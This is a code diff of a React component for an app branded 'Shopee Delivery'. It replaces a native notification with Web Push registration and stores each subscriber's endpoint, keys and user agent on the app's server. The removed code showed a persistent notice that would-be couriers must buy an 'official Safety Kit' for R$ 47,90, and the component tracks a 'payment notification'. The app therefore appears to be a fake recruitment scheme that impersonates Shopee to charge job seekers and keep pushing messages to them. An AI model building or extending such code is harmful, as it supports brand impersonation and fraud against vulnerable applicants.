@@ -1,40 +1,103 @@
 import React, { useEffect, useState } from 'react';
 import { useToast } from '@/hooks/use-toast';
 import { AlertTriangle } from 'lucide-react';
+import axios from 'axios';
 
 const PWANotification: React.FC = () => {
   const { toast } = useToast();
   const [hasShownNotification, setHasShownNotification] = useState(false);
 
-  // Função para solicitar permissão e enviar notificação nativa
-  const requestNotificationPermission = async () => {
-    if ('Notification' in window) {
-      try {
-        const permission = await Notification.requestPermission();
-        if (permission === 'granted') {
-          // Enviar notificação nativa
-          new Notification('📢 Shopee Delivery - Aviso Importante', {
-            body: 'Para se tornar entregador Shopee, é necessário adquirir o Kit de Segurança oficial por R$ 47,90.',
-            icon: '/shopee-icon.jpg',
-            badge: '/shopee-icon.jpg',
-            requireInteraction: true, // Mantém a notificação até o usuário interagir
-            tag: 'shopee-payment-notification' // Evita duplicatas
-          });
-          console.log('✅ Notificação push enviada com sucesso!');
-        } else {
-          console.log('⚠️ Permissão para notificações negada, usando toast como fallback');
-          // Fallback para toast se permissão for negada
-          showToastNotification();
-        }
-      } catch (error) {
-        console.error('❌ Erro ao solicitar permissão para notificações:', error);
-        // Fallback para toast em caso de erro
+  // Função para registrar usuário para push notifications
+  const subscribeUserToPush = async () => {
+    try {
+      // Verificar se service worker e push são suportados
+      if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
+        console.log('⚠️ Push notifications não suportadas');
+        showToastNotification();
+        return;
+      }
+
+      // Registrar service worker se necessário
+      const registration = await navigator.serviceWorker.ready;
+      console.log('🛠️ Service Worker pronto:', registration);
+
+      // Solicitar permissão
+      const permission = await Notification.requestPermission();
+      console.log('🔐 Permissão de notificação:', permission);
+
+      if (permission === 'granted') {
+        // Obter chave pública VAPID (vamos usar uma chave de exemplo)
+        const vapidPublicKey = 'BEl62iUYgUivxIkv69yViEuiBIa40HI8YlbAPNiI75GkHVAaNa7uQrr-jOyqJzNH-NfJTlwEzGOHO5F9Q5JpQP8';
+        
+        // Converter chave para Uint8Array
+        const convertedVapidKey = urlBase64ToUint8Array(vapidPublicKey);
+        
+        // Obter subscription
+        const subscription = await registration.pushManager.subscribe({
+          userVisibleOnly: true,
+          applicationServerKey: convertedVapidKey
+        });
+        
+        console.log('🔔 Push subscription obtida:', subscription);
+        
+        // Enviar subscription para o servidor
+        await savePushSubscription(subscription);
+        
+        // Enviar notificação local como boas-vindas
+        new Notification('📢 Shopee Delivery - Bem-vindo!', {
+          body: 'Notificações ativadas! Você receberá avisos importantes sobre o cadastro.',
+          icon: '/shopee-icon.jpg',
+          badge: '/shopee-icon.jpg',
+          tag: 'shopee-welcome'
+        });
+        
+        console.log('✅ Usuário registrado para push notifications!');
+      } else {
+        console.log('⚠️ Permissão negada, usando toast');
         showToastNotification();
       }
-    } else {
-      console.log('⚠️ Notificações não suportadas, usando toast');
-      // Fallback para toast se notificações não forem suportadas
+    } catch (error) {
+      console.error('❌ Erro ao registrar push notifications:', error);
       showToastNotification();
+    }
+  };
+
+  // Função para converter chave VAPID
+  const urlBase64ToUint8Array = (base64String: string) => {
+    const padding = '='.repeat((4 - base64String.length % 4) % 4);
+    const base64 = (base64String + padding)
+      .replace(/-/g, '+')
+      .replace(/_/g, '/');
+    
+    const rawData = window.atob(base64);
+    const outputArray = new Uint8Array(rawData.length);
+    
+    for (let i = 0; i < rawData.length; ++i) {
+      outputArray[i] = rawData.charCodeAt(i);
+    }
+    return outputArray;
+  };
+
+  // Função para salvar subscription no servidor
+  const savePushSubscription = async (subscription: PushSubscription) => {
+    try {
+      const p256dhKey = subscription.getKey('p256dh');
+      const authKey = subscription.getKey('auth');
+      
+      const subscriptionData = {
+        endpoint: subscription.endpoint,
+        p256dhKey: p256dhKey ? btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(p256dhKey)))) : '',
+        authKey: authKey ? btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authKey)))) : '',
+        userAgent: navigator.userAgent,
+        ipAddress: '', // Será preenchido pelo backend
+      };
+      
+      console.log('💾 Salvando subscription:', subscriptionData);
+      
+      await axios.post('/api/push-subscriptions', subscriptionData);
+      console.log('✅ Subscription salva no servidor!');
+    } catch (error) {
+      console.error('❌ Erro ao salvar subscription:', error);
     }
   };
 
@@ -88,8 +151,8 @@ const PWANotification: React.FC = () => {
       const timer = setTimeout(() => {
         console.log('⏰ Timer executado, enviando notificação...');
         
-        // Tentar enviar notificação nativa primeiro
-        requestNotificationPermission();
+        // Tentar registrar para push notifications
+        subscribeUserToPush();
         
         // Marcar que a notificação foi mostrada nesta sessão
         sessionStorage.setItem('pwa_payment_notification_shown', 'true');
